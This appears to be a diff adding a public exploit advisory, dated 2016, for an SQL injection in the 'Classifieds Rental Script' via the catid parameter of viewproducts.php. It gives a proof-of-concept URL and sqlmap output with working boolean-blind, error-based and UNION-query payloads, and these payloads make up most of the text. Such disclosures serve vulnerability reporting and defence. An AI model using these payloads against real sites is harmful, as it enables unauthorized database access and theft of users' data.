@@ -1,0 +1,26 @@
+# Exploit Title: SQL Injection in Classifieds Rental Script
+# Date: 19 October 2016
+# Exploit Author: Arbin Godar
+# Website : ArbinGodar.com
+# Vendor: www.i-netsolution.com
+
+*----------------------------------------------------------------------------------------------------------------------*
+
+# Proof of Concept SQL Injection/Exploit : 
+http://localhost/[PATH]/viewproducts.php?catid=PoC%27
+
+# Exploit (using Sqlmap)
+---
+Parameter: catid (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+    Payload: catid=-1285' OR 8060=8060#
+
+    Type: error-based
+    Title: MySQL OR error-based - WHERE or HAVING clause
+    Payload: catid=-9700' OR 1 GROUP BY CONCAT(0x717a627071,(SELECT (CASE WHEN (7055=7055) THEN 1 ELSE 0 END)),0x716a767871,FLOOR(RAND(0)*2)) HAVING MIN(0)#
+
+    Type: UNION query
+    Title: MySQL UNION query (random number) - 1 column
+    Payload: catid=-4664' UNION ALL SELECT CONCAT(0x717a627071,0x444c6a6547574179515a64414752636446697064764a5a64745042625072666b5954674a58484577,0x716a767871)#
+---
